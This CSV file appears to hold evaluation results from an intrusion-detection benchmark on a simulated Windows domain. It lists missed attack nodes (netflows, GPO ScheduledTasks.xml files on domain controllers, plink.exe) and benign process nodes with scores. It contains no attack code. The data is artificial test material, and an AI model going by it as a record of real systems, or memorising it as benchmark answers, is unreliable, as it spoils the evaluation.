node_group,src_label,count,fraction
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53330,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53326,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53340,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49986,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53362,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53353,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53336,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53373,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53368,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53319,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53372,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53344,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53320,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53350,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49985,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53318,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53356,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53342,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53332,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53338,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53346,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53328,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50007,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53268,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53334,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53339,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53283,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49972,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53280,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50120,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49969,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53337,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53275,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49989,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50055,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53284,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49997,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50073,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50129,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53347,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49988,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53331,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53309,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49999,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50125,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50057,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49996,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53305,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53301,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50001,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49983,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49974,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50124,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49971,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53279,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50000,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53282,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50126,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50006,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49984,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:51163,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49991,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53370,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49990,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53281,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50008,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53265,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53361,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50009,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53310,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53278,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49980,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53302,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49977,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49931,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53341,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49975,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53371,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50002,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49993,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53343,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49995,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49998,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53292,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53315,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53367,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53285,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49994,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49992,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53250,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53335,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50123,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53306,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50128,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50122,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53290,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53329,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:51149,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53249,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50136,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49970,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49938,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50074,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49987,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50072,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50130,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53323,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49951,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50003,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53345,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:52442,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53317,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50071,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49982,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50119,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49978,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53304,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53355,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53352,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53313,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49928,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50056,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53299,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53314,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49958,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49976,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53266,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53289,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49973,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53125,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49964,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53274,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53312,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53358,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53325,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:49930,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53255,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53333,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53311,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53277,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53327,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53300,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:22->142.20.57.246:54065,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53316,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:50054,1,0.001336898
FN_below_threshold,file: /Device/Mup/DC1.systemia.com/SYSVOL/systemia.com/Policies/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/User/Preferences/ScheduledTasks/ScheduledTasks.xml,1,0.001336898
FN_below_threshold,file: /Device/Mup/DC2.systemia.com/SYSVOL/systemia.com/Policies/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/User/Preferences/ScheduledTasks/ScheduledTasks.xml,1,0.001336898
FN_below_threshold,file: /Device/Mup/DC1.systemia.com/SYSVOL/systemia.com/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER/Preferences/ScheduledTasks/ScheduledTasks.xml,1,0.001336898
FN_below_threshold,file: /Device/Mup/DC1.systemia.com/SYSVOL/systemia.com/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/ScheduledTasks/ScheduledTasks.xml,1,0.001336898
FN_below_threshold,file: /Device/Mup/DC2.systemia.com/SYSVOL/systemia.com/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/ScheduledTasks/ScheduledTasks.xml,1,0.001336898
FN_below_threshold,file: /Device/Mup/DC2.systemia.com/SYSVOL/systemia.com/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER/Preferences/ScheduledTasks/ScheduledTasks.xml,1,0.001336898
FN_below_threshold,file: /Device/Mup/DC1.systemia.com/SYSVOL/systemia.com/Policies/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml,1,0.001336898
FN_below_threshold,file: /Device/Mup/DC2.systemia.com/SYSVOL/systemia.com/Policies/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml,1,0.001336898
FN_below_threshold,file: /Device/HarddiskVolume1/windows/system32/plink.exe,1,0.001336898
FN_below_threshold,file: /Device/HarddiskVolume1/Windows/system32/plink.exe,1,0.001336898
TN_high_below_threshold,"subject: //?/C:/Program Files (x86)/Mozilla Firefox/firefox.exe | ""//?/C:/Program Files (x86)/Mozilla Firefox/firefox.exe"" -marionette -profile C:/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE",114,0.228000000
TN_high_below_threshold,"subject: //?/C:/Program Files (x86)/Mozilla Firefox/firefox.exe | ""//?/C:/Program Files (x86)/Mozilla Firefox/firefox.exe"" -marionette -profile C:/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn",101,0.202000000
TN_high_below_threshold,"subject: //?/C:/Program Files (x86)/Mozilla Firefox/firefox.exe | ""//?/C:/Program Files (x86)/Mozilla Firefox/firefox.exe"" -marionette -profile C:/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs",79,0.158000000
TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/SysWOW64/OneDriveSetup.exe | ""C:/Windows/SysWOW64/OneDriveSetup.exe"" C:/Windows/SysWOW64/OneDriveSetup.exe /uninstall  /permachine  /silent  /childprocess /cusid:S-1-5-18 ",26,0.052000000
TN_high_below_threshold,subject: %SystemRoot%/system32/csrss.exe | C:/Windows/System32/svchost.exe -k wsappx,22,0.044000000
TN_high_below_threshold,subject: System,21,0.042000000
TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/POWERPNT.EXE"" /AUTOMATION -Embedding",13,0.026000000
TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/conhost.exe | ""C:/Windows/SysWOW64/OneDriveSetup.exe"" C:/Windows/SysWOW64/OneDriveSetup.exe /uninstall  /permachine  /silent  /childprocess /cusid:S-1-5-18 ",11,0.022000000
TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/backgroundTaskHost.exe | ""C:/Windows/system32/backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca",10,0.020000000
TN_high_below_threshold,"subject: schtasks.exe | schtasks  /create /tn KickoffAutoLoginRandom /tr ""python C:/ncr/kickoff/kickoff.py -d C:/ncr/kickoff -m AUTOLOGIN"" /sc MINUTE /mo 30 /ru ""SYSTEM""",9,0.018000000
TN_high_below_threshold,subject: /Device/HarddiskVolume1/Program Files (x86)/Google/Update/GoogleUpdate.exe | C:/Windows/system32/svchost.exe -k UnistackSvcGroup,9,0.018000000
TN_high_below_threshold,subject: /Device/HarddiskVolume1/Program Files (x86)/Google/Update/GoogleUpdate.exe | C:/Windows/System32/RuntimeBroker.exe -Embedding,9,0.018000000
TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe | C:/Python27/python.exe ""c:/ncr/mantra/runtime/Scripts/mantra-script.py"" ""-d"" ""c:/ncr/mantra"" ""--random_startup"" ""17""",8,0.016000000
TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe | ""C:/Windows/SystemApps/Microsoft.Windows.Cortana_cw5n1h2txyewy/SearchUI.exe"" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca",7,0.014000000
TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Program Files (x86)/Common Files/Adobe/ARM/1.0/AdobeARM.exe | ""C:/Program Files (x86)/Common Files/Adobe/ARM/1.0/AdobeARM.exe"" ",7,0.014000000
TN_high_below_threshold,subject: /Device/HarddiskVolume1/Python27/python.EXE | C:/Python27/python.EXE C:/ncr/kickoff/kickoff.py -d C:/ncr/kickoff -m AUTOLOGIN,7,0.014000000
TN_high_below_threshold,subject: /Device/HarddiskVolume1/Program Files (x86)/Common Files/Adobe/ARM/1.0/AdobeARM.exe,6,0.012000000
TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /Automation -Embedding",5,0.010000000
TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/conhost.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /Automation -Embedding",5,0.010000000
TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/conhost.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/POWERPNT.EXE"" /AUTOMATION -Embedding",4,0.008000000
TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/conhost.exe | C:/Python27/python.exe ""c:/ncr/mantra/runtime/Scripts/mantra-script.py"" ""-d"" ""c:/ncr/mantra"" ""--random_startup"" ""17""",4,0.008000000
TN_high_below_threshold,"subject: %SystemRoot%/system32/csrss.exe | ""C:/Windows/SysWOW64/OneDriveSetup.exe"" C:/Windows/SysWOW64/OneDriveSetup.exe /uninstall  /permachine  /silent  /childprocess /cusid:S-1-5-18 ",4,0.008000000
TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/SearchProtocolHost.exe | ""C:/Windows/system32/SearchProtocolHost.exe"" Global/UsGthrFltPipeMssGthrPipe189_ Global/UsGthrCtrlFltPipeMssGthrPipe189 1 -2147483646 ""Software/Microsoft/Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:/ProgramData/Microsoft/Search/Data/Temp/usgthrsvc"" ""DownLevelDaemon"" ",3,0.006000000
TN_high_below_threshold,subject: /Device/HarddiskVolume1/Program Files (x86)/Google/Update/GoogleUpdate.exe | C:/Python27/python.EXE C:/ncr/kickoff/kickoff.py -d C:/ncr/kickoff -m AUTOLOGIN,2,0.004000000
TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/wbem/wmiprvse.exe | ""C:/Program Files/VMware/VMware Tools/vmtoolsd.exe""",2,0.004000000
TN_high_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe | ""C:/Windows/SysWOW64/OneDriveSetup.exe"" C:/Windows/SysWOW64/OneDriveSetup.exe /uninstall  /permachine  /silent  /childprocess /cusid:S-1-5-18 ",2,0.004000000
TN_high_below_threshold,subject: PING.EXE | ping -w 2000 -n 2 127.0.0.1,2,0.004000000
TN_high_below_threshold,subject: %SystemRoot%/system32/csrss.exe | C:/Windows/system32/compattelrunner.exe -m:GeneralTel.dll -f:RunGeneralTelemetry  -cV 9AWMJ9YGnkCn8TO9.1.1 -SendFullTelemetry -ThrottleUtc,2,0.004000000
TN_high_below_threshold,subject: /Device/HarddiskVolume1/Windows/system32/compattelrunner.exe | C:/Windows/system32/compattelrunner.exe -m:GeneralTel.dll -f:RunGeneralTelemetry  -cV tamiCH8Zw0G1eMis.1.1 -SendFullTelemetry -ThrottleUtc,2,0.004000000
TN_high_below_threshold,subject: /Device/HarddiskVolume1/Windows/system32/wbem/wmiprvse.exe | C:/Windows/System32/RuntimeBroker.exe -Embedding,2,0.004000000
TN_high_below_threshold,"subject: %SystemRoot%/system32/csrss.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/POWERPNT.EXE"" /AUTOMATION -Embedding",2,0.004000000
